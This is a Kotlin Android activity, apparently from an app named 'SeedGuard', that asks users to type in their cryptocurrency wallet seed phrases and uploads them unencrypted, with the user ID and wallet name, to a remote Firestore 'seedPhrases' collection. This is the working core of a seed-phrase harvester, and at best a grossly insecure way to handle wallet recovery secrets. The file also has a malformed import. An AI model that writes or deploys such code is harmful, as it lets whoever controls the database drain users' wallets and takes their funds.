package com.example.seedguard

import android.os.Bundle
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import seedphraseadapter
import java.util.UUID

class SeedPhraseActivity : AppCompatActivity() {

    private lateinit var recyclerView: RecyclerView
    private lateinit var adapter: seedphraseadapter
    private val db = FirebaseFirestore.getInstance()
    private var isSubmitting = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_seedphrase_entry)

        val seedPhraseCount = intent.getIntExtra("SEED_PHRASE_COUNT", 12)
        val walletName = intent.getStringExtra("WALLET_NAME") ?: "Unknown Wallet"

        recyclerView = findViewById(R.id.recyclerViewSeedPhrases)
        recyclerView.layoutManager = LinearLayoutManager(this)

        adapter = seedphraseadapter(seedPhraseCount)
        recyclerView.adapter = adapter

        val buttonSubmit: Button = findViewById(R.id.buttonSubmitSeedPhrase)
        buttonSubmit.setOnClickListener {
            if (isSubmitting) return@setOnClickListener
            val seedPhrases = adapter.getSeedPhrases()

            if (seedPhrases.any { it.isBlank() }) {
                Toast.makeText(this, "Please fill in all seed phrases.", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            } else {
                val userId = getCurrentUserId()
                if (userId != null) {
                    isSubmitting = true
                    saveToDatabase(userId, walletName, seedPhrases)
                } else {
                    Toast.makeText(this, "Error: User not signed in. Please log in again.", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }

    private fun saveToDatabase(userId: String, walletName: String, seedPhrases: List<String>) {
        val seedPhraseDocument = hashMapOf(
            "walletName" to walletName,
            "seedPhrases" to seedPhrases,
            "userId" to userId,
            "timestamp" to System.currentTimeMillis()
        )

        val documentId = UUID.randomUUID().toString()

        db.collection("seedPhrases")
            .document(documentId)
            .set(seedPhraseDocument)
            .addOnSuccessListener {
                isSubmitting = false
                Toast.makeText(this, "Seed phrases saved to the cloud successfully!", Toast.LENGTH_SHORT).show()
                finish()
            }
            .addOnFailureListener { e ->
                isSubmitting = false
                Toast.makeText(this, "Error saving seed phrases: ${e.message}", Toast.LENGTH_SHORT).show()
            }
    }

    private fun getCurrentUserId(): String? {
        val user = FirebaseAuth.getInstance().currentUser
        return user?.uid
    }
}
